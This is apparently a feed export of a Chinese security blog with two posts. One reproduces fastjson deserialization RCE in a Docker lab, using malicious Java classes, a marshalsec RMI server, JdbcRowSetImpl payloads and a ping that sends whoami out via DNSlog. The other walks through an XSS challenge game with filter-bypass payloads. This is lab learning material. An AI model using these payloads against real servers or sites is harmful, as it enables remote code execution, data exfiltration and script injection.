id="fastjson反序列化漏洞原理"><a href="#fastjson反序列化漏洞原理" class="headerlink" title="fastjson反序列化漏洞原理"></a>fastjson反序列化漏洞原理</h2><p>fastjson的漏洞本质还是一个java的反序列化漏洞，由于引进了AutoType功能，fastjson在对json字符串反序列化的时候，会读取到@type的内容，将json内容反序列化为java对象并调用这个类的setter方法，fastjson引入了AutoType，即在序列化的时候，先把原始类型记录下来。使用@type的键记录原始类型<br>使用autotype处理Json对象的时候，如果未对@type字段进行完整的安全性验证，攻击者可以传入危险类，并调用危险类连接远程RMI主机，通过其中的恶意类执行代码，攻击者通过这种方式可以实现远程代码执行漏洞，获取服务器敏感信息，甚至可以利用此漏洞进一步的对服务器数据进行操作。说白了就是，FastJson在解析json的过程中，支持使用@type字段来指定反序列化的类型，并调用该类的set或get方法来访问属性，当组件开启了autotype功能并且反序列化不可信数据时，攻击者可以构造数据，从而进行进一步的利用，我用ppt大概做一个流程图</p><img src="/2024/03/03/fastjson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/2024-03-03_21-14.png" class="" title="2024-03-03_21-14.png"><h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="1-2-24"><a href="#1-2-24" class="headerlink" title="1.2.24"></a>1.2.24</h3><p>我这里用docker搭建复现环境</p><img src="/2024/03/03/fastjson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/2024-03-02_15-14.png" class="" title="2024-03-02_15-14.png"><h6 id="-2"><a href="#-2" class="headerlink" title=""></a></h6><p>1.2.24是没有任何fastjson特征，我们构造数据包，用POST请求，并且加上Content-Type: application&#x2F;json,发包可以证实 啥特征没有</p><img src="/2024/03/03/fastjson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/2024-03-03_20-29.png" class="" title="2024-03-03_20-29.png"><h6 id="-3"><a href="#-3" class="headerlink" title=""></a></h6><p>首先编译恶意类代码，我们以在&#x2F;tmp目录下创建一个successFrank文件为复现成功标志：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.Runtime;<br><span class="hljs-keyword">import</span> java.lang.Process;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TouchFile</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Runtime</span> <span class="hljs-variable">rt</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>            String[] commands = &#123;<span class="hljs-string">&quot;touch&quot;</span>, <span class="hljs-string">&quot;/tmp/successFrank&quot;</span>&#125;;<br>            <span class="hljs-type">Process</span> <span class="hljs-variable">pc</span> <span class="hljs-operator">=</span> rt.exec(commands);<br>            pc.waitFor();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-comment">// do nothing</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后用javac编译成class文件，然后在当前目录用python启动一个http服务，这个时候就用到我们的marshalsec，启动一个RMI服务器，设置监听端口，并制定加载远程的恶意类<br>（marshalsec下载地址：<a href="https://github.com/mbechler/marshalsec.git">https://github.com/mbechler/marshalsec.git</a>)<br>(需要手动maven编译成jar包）</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -cp marshalsec-<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">3</span>-SNAPSHOT-<span class="hljs-literal">all</span>.jar marshalsec.jndi.RMIRefServer <span class="hljs-string">&quot;http://liuty_ip:port/#TouchFile&quot;</span> <span class="hljs-number">9999</span>（指定的端口）<br></code></pre></td></tr></table></figure><p>随后抓包，同样使用POST请求，并且加上Content-Type，在最后输入payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;b&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;dataSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;rmi://liuty_ip:9999/TouchFile&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;autoCommit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>    <span class="hljs-punctuation">&#125;</span><br><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>发送数据包</p><img src="/2024/03/03/fastjson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/2024-03-03_19-33_1.png" class="" title="2024-03-03_19-33_1.png"><h6 id="-4"><a href="#-4" class="headerlink" title=""></a></h6><p>检测一下是否在tmp目录touch创建了文件successFrank即可，success!</p><img src="/2024/03/03/fastjson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/2024-03-03_16-58.png" class="" title="2024-03-03_16-58.png"><h6 id="-5"><a href="#-5" class="headerlink" title=""></a></h6><p>dnslog回显<br>创建一个恶意类，执行ping命令</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.Runtime;<br><br><span class="hljs-keyword">import</span> java.lang.Process;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">dnslog</span>&#123;<br><br>    <span class="hljs-keyword">static</span> &#123;<br><br>        <span class="hljs-keyword">try</span> &#123;<br><br>            <span class="hljs-type">Runtime</span> <span class="hljs-variable">rt</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br><br>            String[] commands = &#123; <span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;ping user.`whoami`.dnslog地址&quot;</span>&#125;;<br><br>            <span class="hljs-type">Process</span> <span class="hljs-variable">pc</span> <span class="hljs-operator">=</span> rt.exec(commands);<br><br>            pc.waitFor();<br><br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br><br>            <span class="hljs-comment">// 1</span><br><br>        &#125;<br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>步骤同上，修改完数据包之后，放包 成功回显</p><img src="/2024/03/03/fastjson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/2024-03-03_20-30.png" class="" title="2024-03-03_20-30.png"><h6 id="-6"><a href="#-6" class="headerlink" title=""></a></h6><img src="/2024/03/03/fastjson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/2024-03-03_19-34.png" class="" title="2024-03-03_19-34.png"><h5 id="-7"><a href="#-7" class="headerlink" title=""></a></h5><h3 id="1-2-47"><a href="#1-2-47" class="headerlink" title="1.2.47"></a>1.2.47</h3><p>在47版本中最明显的点就是json报错会出现fastjson特征</p><img src="/2024/03/03/fastjson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/2024-03-03_17-00.png" class="" title="2024-03-03_17-00.png"><h6 id="-8"><a href="#-8" class="headerlink" title=""></a></h6><p>dnslog回显<br>构造数据包</p><img src="/2024/03/03/fastjson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/2024-03-03_20-31.png" class="" title="2024-03-03_20-31.png"><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;dataSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://192.168.110.208:28888/Object&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;autoCommit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><img src="/2024/03/03/fastjson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/2024-03-03_20-38.png" class="" title="2024-03-03_20-38.png"><h6 id="-9"><a href="#-9" class="headerlink" title=""></a></h6><img src="/2024/03/03/fastjson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/2024-03-03_20-36.png" class="" title="2024-03-03_20-36.png"><h6 id="-10"><a href="#-10" class="headerlink" title=""></a></h6><p>反弹shell</p><img src="/2024/03/03/fastjson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/2024-03-03_20-50.png" class="" title="2024-03-03_20-50.png"><h6 id="-11"><a href="#-11" class="headerlink" title=""></a></h6>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞总结</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>玩个闯关小游戏</title>
    <link href="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/"/>
    <url>/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/</url>
    
    <content type="html"><![CDATA[<p>昨天中午睡了一觉，一个朋友邀请我来玩一个闯关游戏，发过来一看是一个xss闯关小游戏，虽然早有耳闻，但是说实话一次也没玩过；正好下午没什么事情，就玩玩这个游戏，就当打发时间了..(纯玩玩，毕竟不能耽误我刷抖音😊)</p><p>第一关</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-01.png" class="" title="2024-02-29_08-01.png"><h6 id=""><a href="#" class="headerlink" title=""></a></h6><p>毕竟第一关，估计最简单，总不能在第一关的boss都打不出血吧，直接看源码</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-02.png" class="" title="2024-02-29_08-02.png"><h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><p>果然所有符号都没过滤，也没有转义，那不直接上payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;xss&quot;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-06.png" class="" title="2024-02-29_08-06.png"><h6 id="-2"><a href="#-2" class="headerlink" title=""></a></h6><p>第二关<br>在输入框中输入测试语句（如下，后面都用这个做测试）可以看到输入框中没有显示出双引号，此处语句应该是被双引号闭合</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> &quot;&#x27;/<span class="hljs-attr">0n</span>&gt;</span><br></code></pre></td></tr></table></figure><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-11.png" class="" title="2024-02-29_08-11.png"><h6 id="-3"><a href="#-3" class="headerlink" title=""></a></h6><p>通过观察源码，可以看到输入的参数是被双引号闭合着带入到input标签中</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-12.png" class="" title="2024-02-29_08-12.png"><h6 id="-4"><a href="#-4" class="headerlink" title=""></a></h6><p>所以需要在开头构造一个”&gt;把签名input标签闭合掉，在结尾构造一个”&lt;把input剩下的尖括号闭合即可</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;xss&quot;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>&lt;&quot;<br></code></pre></td></tr></table></figure><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-13.png" class="" title="2024-02-29_08-13.png"><h6 id="-5"><a href="#-5" class="headerlink" title=""></a></h6><p>第三关<br>在输入框中输入测试语句，输入框的内容里没有单引号，此处语句应该是被单引号闭合</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-14.png" class="" title="2024-02-29_08-14.png"><h6 id="-6"><a href="#-6" class="headerlink" title=""></a></h6><p>观察源码可知，大小于号和双引号被转义，但是单引号没有被转义且参数是用单引号闭合的</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-21.png" class="" title="2024-02-29_08-21.png"><h6 id="-7"><a href="#-7" class="headerlink" title=""></a></h6><p>由于大于号被转义，我们需要使用哪些不需要用到标签的语句来触发XSS漏洞比如说用事件触发的形式，同时使用单引号来闭合</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-string">&#x27;onmouseover=&#x27;</span><span class="hljs-function"><span class="hljs-title">alert</span>(<span class="hljs-string">&quot;xss&quot;</span>)</span><br></code></pre></td></tr></table></figure><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-19.png" class="" title="2024-02-29_08-19.png"><h6 id="-8"><a href="#-8" class="headerlink" title=""></a></h6><p>第四关<br>在输入框中输入测试语句，发现搜索框里没有小于号，估计是被转义了，内容也是到script截止，说明内容是由双引号闭合的</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-24.png" class="" title="2024-02-29_08-24.png"><h6 id="-9"><a href="#-9" class="headerlink" title=""></a></h6><p>在网页源代码第17行中可以发现，大小于号已被过滤，引号没有被过滤或转义，参数采用的是双引号的闭合方式</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-26.png" class="" title="2024-02-29_08-26.png"><h6 id="-10"><a href="#-10" class="headerlink" title=""></a></h6><p>payload</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-string">&quot;onmouseover=&quot;</span><span class="hljs-function"><span class="hljs-title">alert</span>(/<span class="hljs-variable">xss</span>/)</span><br></code></pre></td></tr></table></figure><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-27.png" class="" title="2024-02-29_08-27.png"><h6 id="-11"><a href="#-11" class="headerlink" title=""></a></h6><p>第五关<br>在输入框中输入测试语句，发现在r与i之间多了一个_符号，猜测是关键字被转义了</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-29.png" class="" title="2024-02-29_08-29.png"><h6 id="-12"><a href="#-12" class="headerlink" title=""></a></h6><p>看源码我们发现两个关键字被转义，大小于号和引号没有被过滤与转义，用双引号闭合方式，可利用其他关键字绕过</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-31.png" class="" title="2024-02-29_08-31.png"><h6 id="-13"><a href="#-13" class="headerlink" title=""></a></h6><p>尝试img标签</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-string">&quot;&gt;&lt;IMG SRC=&quot;</span><span class="hljs-variable">javascript</span>:<span class="hljs-function"><span class="hljs-title">alert</span>(<span class="hljs-string">&#x27;XSS&#x27;</span>);<span class="hljs-string">&quot;&gt;&lt;&quot;</span></span><br></code></pre></td></tr></table></figure><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-32.png" class="" title="2024-02-29_08-32.png"><h6 id="-14"><a href="#-14" class="headerlink" title=""></a></h6><p>虽然…但是无法进行弹窗，尝试修改为a标签，成功弹窗</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-string">&quot;&gt;&lt;a href=&quot;</span><span class="hljs-variable">javascript</span>:<span class="hljs-function"><span class="hljs-title">alert</span>(<span class="hljs-string">&#x27;XSS&#x27;</span>);<span class="hljs-string">&quot;&gt;xss&lt;&quot;</span></span><br></code></pre></td></tr></table></figure><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-35.png" class="" title="2024-02-29_08-35.png"><h6 id="-15"><a href="#-15" class="headerlink" title=""></a></h6><p>第六关<br>在输入框中输入测试语句，感觉与上一关貌似是一样的</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-36.png" class="" title="2024-02-29_08-36.png"><h6 id="-16"><a href="#-16" class="headerlink" title=""></a></h6><p>那直接利用上一关的payload，发现href被转义了….啊。。这。。</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-37_1.png" class="" title="2024-02-29_08-37_1.png"><h6 id="-17"><a href="#-17" class="headerlink" title=""></a></h6><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-39.png" class="" title="2024-02-29_08-39.png"><h6 id="-18"><a href="#-18" class="headerlink" title=""></a></h6><p>采用大小写即可绕过</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-string">&quot;&gt;&lt;a Href=&quot;</span><span class="hljs-variable">javascript</span>:<span class="hljs-function"><span class="hljs-title">alert</span>(<span class="hljs-string">&#x27;XSS&#x27;</span>);<span class="hljs-string">&quot;&gt;xss&lt;&quot;</span></span><br></code></pre></td></tr></table></figure><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-40.png" class="" title="2024-02-29_08-40.png"><h6 id="-19"><a href="#-19" class="headerlink" title=""></a></h6><p>第七关<br>在输入框中输入测试语句，只显示了&lt;括号，猜测可能是script被过滤</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-41.png" class="" title="2024-02-29_08-41.png"><h6 id="-20"><a href="#-20" class="headerlink" title=""></a></h6><p>看源码可以看到script被过滤，采用双引号闭合</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-42.png" class="" title="2024-02-29_08-42.png"><h6 id="-21"><a href="#-21" class="headerlink" title=""></a></h6><p>经过尝试可以使用script双写绕过</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">scrscriptipt</span>&gt;</span>alert(/xss/)<span class="hljs-tag">&lt;/<span class="hljs-name">scrscriptipt</span>&gt;</span>&lt;&quot;<br></code></pre></td></tr></table></figure><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-43.png" class="" title="2024-02-29_08-43.png"><h6 id="-22"><a href="#-22" class="headerlink" title=""></a></h6><p>第八关<br>在输入框中输入测试语句，输入的值均显示在页面上</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-44.png" class="" title="2024-02-29_08-44.png"><h6 id="-23"><a href="#-23" class="headerlink" title=""></a></h6><p>分析源码可知，大小于号被转义、双引号被转义，语句采用双引号闭合方式，并且在20行可以看到大小于号被转义回来，关键字被插入下划线</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-44_1.png" class="" title="2024-02-29_08-44_1.png"><h6 id="-24"><a href="#-24" class="headerlink" title=""></a></h6><p>可以使用javascript伪协议，javascript中的script会被转义为scr_ipt，源码中会对部分html实体编码转换为正常的字符，所以尝试采用将script htlm实体编码</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-48.png" class="" title="2024-02-29_08-48.png"><h6 id="-25"><a href="#-25" class="headerlink" title=""></a></h6><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">java&amp;<span class="hljs-attr">#x0073</span>;&amp;<span class="hljs-attr">#x0063</span>;&amp;<span class="hljs-attr">#x0072</span>;&amp;<span class="hljs-attr">#x0069</span>;&amp;<span class="hljs-attr">#x0070</span>;&amp;<span class="hljs-attr">#x0074</span>;:alert<span class="hljs-comment">(/xss/)</span><br></code></pre></td></tr></table></figure><p>点击友情链接成功弹窗<br>pass!</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-48_1.png" class="" title="2024-02-29_08-48_1.png"><h6 id="-26"><a href="#-26" class="headerlink" title=""></a></h6><p>第九关<br>在输入框中输入测试语句，输入的值也是显示在页面上</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-49.png" class="" title="2024-02-29_08-49.png"><h6 id="-27"><a href="#-27" class="headerlink" title=""></a></h6><p>感觉和上一关差不多的情况，大小于号被转义、双引号被转义、、大写变小写，采用双引号闭合，有意思的是：在20行提示“您的链接不合法？有没有！”<br>what??什么鬼？？和链接有关？难不成和http&#x2F;https有关..</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-51.png" class="" title="2024-02-29_08-51.png"><h6 id="-28"><a href="#-28" class="headerlink" title=""></a></h6><p>尝试输入一个正常的链接提交试试，发现返回是合法的</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-53.png" class="" title="2024-02-29_08-53.png"><h6 id="-29"><a href="#-29" class="headerlink" title=""></a></h6><p>所以将http:&#x2F;&#x2F;写入到payload中让他匹配到存在即会返回合法，所以构造pyload</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-53_1.png" class="" title="2024-02-29_08-53_1.png"><h6 id="-30"><a href="#-30" class="headerlink" title=""></a></h6><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">java&amp;#x0073;&amp;#x0063;&amp;#x0072;&amp;#x0069;&amp;#x0070;&amp;#x0074;:alert(<span class="hljs-string">&#x27;http://xss&#x27;</span>)<br></code></pre></td></tr></table></figure><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-54.png" class="" title="2024-02-29_08-54.png"><h6 id="-31"><a href="#-31" class="headerlink" title=""></a></h6><p>第十关<br>在url中输入测试语句，页面显示看不出什么信息</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-55.png" class="" title="2024-02-29_08-55.png"><h6 id="-32"><a href="#-32" class="headerlink" title=""></a></h6><p>分析源码，发现第15行大小于号被转义、双引号都被转义，语句采用双引号闭合。在第17、18、19行，发现三个输入参数，分别是t_link、t_history、t_sort</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-59.png" class="" title="2024-02-29_08-59.png"><h6 id="-33"><a href="#-33" class="headerlink" title=""></a></h6><p>输入测试语句</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">?t_history=<span class="hljs-tag">&lt;<span class="hljs-name">script</span> &quot;&#x27;/<span class="hljs-attr">0n</span>&gt;</span><span class="language-javascript">&amp;t_sort=<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> &quot;&#x27;/<span class="hljs-attr">0n</span>&gt;</span></span>&amp;t_link=<span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> &quot;&#x27;/<span class="hljs-attr">0n</span>&gt;</span></span></span></span></span><br></code></pre></td></tr></table></figure><p>发现只有t_sort有值，大小于号被过滤，采用双引号闭合</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_09-01.png" class="" title="2024-02-29_09-01.png"><h6 id="-34"><a href="#-34" class="headerlink" title=""></a></h6><p>那payload构造的时候，就不需要用&gt;&lt;的事件触发方式构造语句</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">t_sort</span>=sb&quot; <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attribute">onclick</span>=<span class="hljs-string">&quot;alert(/xss/)</span><br><span class="hljs-string"></span><br><span class="hljs-string"># ?t_sort=表示参数是传递给谁</span><br><span class="hljs-string"># sb&quot;</span>给input赋值同时闭合双引号<br><span class="hljs-comment"># 修改type属性为按钮方便事件触发</span><br><span class="hljs-comment"># onclik则表示点击时触发事件</span><br></code></pre></td></tr></table></figure><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_09-03.png" class="" title="2024-02-29_09-03.png"><h6 id="-35"><a href="#-35" class="headerlink" title=""></a></h6><p>第十一关<br>在url中输入测试语句，页面显示看不出什么信息</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_11-10.png" class="" title="2024-02-29_11-10.png"><h6 id="-36"><a href="#-36" class="headerlink" 